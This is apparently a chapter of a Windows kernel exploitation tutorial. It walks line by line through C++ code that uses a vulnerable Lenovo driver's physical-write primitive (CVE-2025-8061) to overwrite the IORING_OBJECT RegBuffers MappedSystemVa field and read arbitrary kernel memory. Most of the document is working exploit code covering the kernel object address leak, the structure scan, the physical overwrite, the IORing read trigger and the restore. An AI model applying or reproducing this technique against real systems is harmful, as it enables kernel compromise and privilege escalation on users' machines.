# 07 — IORing RegBuffers Corruption (Arbitrary Kernel VA Read)

**File:** `07_ioring.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Platform:** Windows 11 22H2+ (build ≥ 22621)  
**Primitive used:** Physical write (1 QWORD) + IORing API  
**Output:** Read any kernel VA via the I/O file channel

---

## Objective

Demonstrate an independent technique: by overwriting a single field in the `IORING_OBJECT` kernel struct, the IORing subsystem will read memory from any kernel VA we specify and write it to a file — enabling full kernel memory reads entirely through a user-mode API, with no physical scan or page table walk required.

---

## Background Theory

### What is IORing?

`NtCreateIoRing` (Win11 22H2+) creates a ring buffer that allows user-mode to queue multiple async I/O operations without issuing multiple syscalls. When `SubmitIoRing` is called, the kernel processes all queued operations at once.

### Registered Buffers

`BuildIoRingRegisterBuffers` allows "pinning" a user-mode buffer to physical memory and registering it with the kernel. The kernel creates an MDL (Memory Descriptor List), pins the pages, and stores the kernel-mode mapping VA into `IORING_OBJECT.RegBuffers[i].MappedSystemVa`.

When `IORING_OP_WRITE_FILE` runs with `buffer_index = i`, the kernel reads from `RegBuffers[i].MappedSystemVa` and writes to the file. **The kernel does not re-validate `MappedSystemVa` after registration.**

### Exploit Vector

```
1. Register user buffer → kernel creates MappedSystemVa = kernel_VA_of_our_buffer
2. Overwrite RegBuffers[0].MappedSystemVa = any_kernel_VA   ← using LnvMSRIO write
3. BuildIoRingWriteFile(tempFile, buffer_index=0, len=N)
4. SubmitIoRing → kernel reads N bytes from any_kernel_VA → writes to tempFile
5. ReadFile(tempFile) → we receive N bytes of arbitrary kernel memory
```

---

## Line-by-Line Code Explanation

### Version Check

```cpp
OSVERSIONINFOEXW ovi = { sizeof(ovi) };
auto RtlGetVer = (LONG(NTAPI*)(OSVERSIONINFOEXW*))
    GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
RtlGetVer(&ovi);

if (ovi.dwBuildNumber < 22621) {
    printf("[!] IORing registered buffers require Win11 22H2 (build 22621+)\n");
    return 1;
}
```

`RtlGetVersion` bypasses the compatibility shim of `GetVersionEx`. `RegisteredBuffers` only exists in `IORING_VERSION_3` (Win11 22H2+).

### Load IoRing APIs Dynamically

```cpp
HMODULE kb = LoadLibraryA("KernelBase.dll");

#define LOAD(sym, var) \
    var = (decltype(var))GetProcAddress(kb, sym); \
    if (!var) { printf("[-] %s not found\n", sym); return false; }

LOAD("CreateIoRing",               IoRingCreate)
LOAD("BuildIoRingRegisterBuffers", IoRingRegBufs)
LOAD("SubmitIoRing",               IoRingSubmit)
LOAD("BuildIoRingWriteFile",       IoRingWriteFile)
LOAD("PopIoRingCompletion",        IoRingPop)
LOAD("CloseIoRing",                IoRingClose)
```

IORing APIs reside in `KernelBase.dll`. Dynamic loading avoids link errors on older SDKs.

### Step 1: Allocate User Buffer with Sentinel

```cpp
const SIZE_T BUF_SIZE = 0x1000;
const uint64_t SENTINEL = 0xDEADC0DEBEEF1337ULL;

auto *user_buf = (uint8_t*)VirtualAlloc(nullptr, BUF_SIZE,
                                         MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

// Fill the entire buffer with an easily recognizable pattern
for (SIZE_T i = 0; i + 8 <= BUF_SIZE; i += 8)
    *(uint64_t*)(user_buf + i) = SENTINEL;
```

Fill with a sentinel so we can verify later: `KernelRead(MappedSystemVa)` should return this pattern → proves we located the correct `MappedSystemVa`.

### Step 2: Create IoRing

```cpp
HIORING ring = nullptr;
IORING_CREATE_FLAGS cf = { IORING_CREATE_ADVISORY_FLAGS_NONE,
                            IORING_CREATE_REQUIRED_FLAGS_NONE };
HRESULT hr = IoRingCreate(IORING_VERSION_3, cf,
                           64,    // SQ queue size
                           64,    // CQ queue size
                           &ring);
```

### Step 3: Register Buffer

```cpp
IORING_BUFFER_INFO buf_info = { user_buf, BUF_SIZE };
hr = IoRingRegBufs(ring, 1, &buf_info, 0);  // register 1 buffer

UINT32 submitted = 0;
hr = IoRingSubmit(ring, 1, INFINITE, &submitted);
// Submit registration operation → kernel processes it → creates MDL, pins pages, sets MappedSystemVa
```

After this `SubmitIoRing`, the kernel has:
1. Created an MDL for `user_buf`
2. Pinned the physical pages of the buffer
3. Created a kernel mapping VA
4. Stored it in `IORING_OBJECT.RegBuffers[0].MappedSystemVa`

### Step 4: Find the IORING_OBJECT VA

```cpp
// NtQuerySystemInformation(0x10 = SystemHandleInformation)
// returns all kernel object pointers for every handle
uint64_t ioring_va = HandleToObjectVa(hKernel);
```

```cpp
static uint64_t HandleToObjectVa(HANDLE h)
{
    // Allocate buffer, call NtQSI with class 0x10
    auto *info = (SYS_HANDLE_INFO*)buf;
    DWORD my_pid = GetCurrentProcessId();
    USHORT hval  = (USHORT)(ULONG_PTR)h;  // handle value
    
    for (ULONG i = 0; i < info->Count; i++) {
        if (info->Entries[i].Pid == (USHORT)my_pid &&   // filter by PID
            info->Entries[i].Handle == hval) {           // filter by handle value
            return (uint64_t)(uintptr_t)info->Entries[i].Object;  // kernel object VA
```

`SYS_HANDLE_ENTRY.Object` is the kernel VA of the IORING_OBJECT. No physical scan needed — `NtQuerySystemInformation` leaks it directly.

### Steps 5–6: Scan IORING_OBJECT to Find the RegBuffers Entry

```cpp
static bool FindRegBufEntry(uint64_t cr3, uint64_t ioring_va,
                             SIZE_T buf_size, RegBufInfo *out)
{
    uint8_t obj_dump[0x200] = {};
    KernelRead(cr3, ioring_va, obj_dump, sizeof(obj_dump));  // read 512 bytes of IORING_OBJECT

    // Scan every 8-byte aligned slot
    for (int off = 0; off + 8 <= (int)sizeof(obj_dump); off += 8) {
        uint64_t cand = *(uint64_t*)(obj_dump + off);
        if ((cand >> 48) != 0xFFFF) continue;  // must be a kernel VA
        if (cand & 0x7) continue;              // must be 8-byte aligned
```

```cpp
        // Try 1: cand is a direct pointer to NT_IORING_BUFFER_REG
        // NT_IORING_BUFFER_REG layout:
        //   +0x00 LIST_ENTRY (16 bytes)
        //   +0x10 MappedSystemVa (8 bytes) ← this is what we need to overwrite
        //   +0x18 Length (8 bytes)
        //   +0x20 Mdl (8 bytes)
        
        uint64_t mv = 0, len = 0;
        KernelRead(cr3, cand + 0x10, &mv, 8);   // read MappedSystemVa
        KernelRead(cr3, cand + 0x18, &len, 8);  // read Length

        if ((mv >> 48) == 0xFFFF && len == (uint64_t)buf_size) {
            // mv must be a kernel VA, len must match the registered buffer size
            out->entry_va     = cand;
            out->mapped_va    = mv;
            out->mapped_va_pa = VaToPa(cr3, cand + 0x10);  // PA of the MappedSystemVa field
            out->length       = len;
            return true;
        }
```

```cpp
        // Try 2: cand is a pointer-to-array (RegBuffers = Ptr64 → Ptr64[])
        uint64_t entry_ptr = 0;
        KernelRead(cr3, cand, &entry_ptr, 8);  // dereference
        if ((entry_ptr >> 48) != 0xFFFF || (entry_ptr & 7)) continue;
        
        KernelRead(cr3, entry_ptr + 0x10, &mv2, 8);
        KernelRead(cr3, entry_ptr + 0x18, &len2, 8);
        
        if ((mv2 >> 48) == 0xFFFF && len2 == (uint64_t)buf_size) {
            // Found via double-dereference
```

Two patterns for finding the RegBuffers entry: direct pointer or pointer-to-pointer. Both are needed because the IORING_OBJECT layout is undocumented and may differ across builds.

### Step 7: Verify

```cpp
static bool VerifyMappedVa(uint64_t cr3, uint64_t mapped_va,
                            const uint8_t *user_buf, DWORD check_len)
{
    uint8_t kern_buf[64] = {};
    KernelRead(cr3, mapped_va, kern_buf, check_len);
    return memcmp(kern_buf, user_buf, check_len) == 0;
    // If match → mapped_va truly points to our user buffer (as mapped by the kernel)
}
```

### Step 10: Overwrite MappedSystemVa

```cpp
// Write to the PA of the MappedSystemVa field, not the VA
// Because we have mapped_va_pa = VaToPa(cr3, entry_va + 0x10)

PhysWriteU64(entry.mapped_va_pa, nt_base);
// nt_base = ntoskrnl.exe kernel VA base

// Verify write
uint64_t rb = 0;
PhysReadU64(entry.mapped_va_pa, &rb);
// Expected: rb == nt_base
```

Now `RegBuffers[0].MappedSystemVa = ntoskrnl_base`. When IORing writes the file, the kernel will read from ntoskrnl_base (the MZ header) instead of the user buffer.

### Step 11: Trigger Read via IORing Write

```cpp
IORING_HANDLE_REF fref = { IORING_HANDLE_REF_RAW, { hFile } };
IORING_BUFFER_REF bref = {};
bref.Kind = IORING_REF_REGISTERED;
bref.Registered.BufferIndex = 0;  // use the registered buffer (whose MappedVa was overwritten)
bref.Registered.Offset = 0;

// Request: write 4 bytes from buffer[0] to the file at offset 0
hr = IoRingWriteFile(ring, fref, bref, 4, 0,
                     FILE_WRITE_FLAGS_NONE, 0xCAFE, IORING_SQE_FLAGS_NONE);

UINT32 sub2 = 0;
hr = IoRingSubmit(ring, 1, 5000, &sub2);
// Kernel: reads 4 bytes from RegBuffers[0].MappedSystemVa = ntoskrnl_base
//         writes to hFile
```

### Step 12: Read the Result

```cpp
SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
uint8_t file_bytes[4] = {};
DWORD got = 0;
ReadFile(hFile, file_bytes, 4, &got, nullptr);

// Expected: file_bytes = {0x4D, 0x5A, ...} = "MZ" = ntoskrnl header!
bool success = (got == 4) && (file_bytes[0] == 'M') && (file_bytes[1] == 'Z');
```

`MZ` in the file = proof that the kernel read 4 bytes from ntoskrnl.exe's base VA and wrote them to the file.

### Step 13: Restore

```cpp
printf("[*] Restoring RegBuffers[0].MappedSystemVa...\n");
PhysWriteU64(entry.mapped_va_pa, entry.mapped_va);
// Restore to the original value (VA of the kernel mapping of our user buffer)
```

---

## Why This Technique Matters

If an attacker has **any primitive that writes 1 QWORD into the kernel** (UAF, pool overflow, arbitrary write via another bug), they can use IORing to read arbitrary kernel memory with **no second driver**, no complex page table walk. All that is required:
1. Locate the `MappedSystemVa` field (offset is not fixed but can be scanned)
2. Overwrite it
3. Use `WriteFile` via IORing → data lands in a file → read from user-mode

---

## Stability

| Issue | Explanation |
|-------|-------------|
| Win11 22H2+ only | API does not exist on Win10 / Win11 21H2 |
| IORING_OBJECT offset scan | No hardcoded offsets → more robust, but the scan may fail on future builds |
| MappedSystemVa size check | Length must match the registered buffer size — mismatch may crash the kernel |
| PID > 65535 | `SYS_HANDLE_ENTRY.Pid` is USHORT → PIDs above 65535 will overflow. Rare but possible |
| MMIO skip | Added `if (pa >= 0xC0000000 && pa < 0x100000000) continue` in GetSystemCR3 |

---

## Flow Summary

```
VirtualAlloc(BUF_SIZE) → user_buf (filled with SENTINEL)
    ↓
CreateIoRing(v3) → ring, hKernel
BuildIoRingRegisterBuffers(user_buf) → SubmitIoRing
    ↓ kernel: MDL pin → MappedSystemVa = kernel_mapping_of_user_buf
    ↓
HandleToObjectVa(hKernel) → ioring_va
GetSystemCR3() → cr3
    ↓
KernelRead(ioring_va, 0x200 bytes)
Scan → find entry where MappedVa = kernel VA and Length = BUF_SIZE
→ entry.mapped_va_pa = PA of the MappedSystemVa field
    ↓
PhysWriteU64(entry.mapped_va_pa, ntoskrnl_base)
    ↓
BuildIoRingWriteFile(file, bufIdx=0, len=4) → SubmitIoRing
    kernel reads 4 bytes from ntoskrnl_base → writes to file
    ↓
ReadFile → {4D 5A ...} = "MZ" ✓ (ntoskrnl header!)
    ↓
PhysWriteU64(entry.mapped_va_pa, original_mapped_va)  ← RESTORE
```
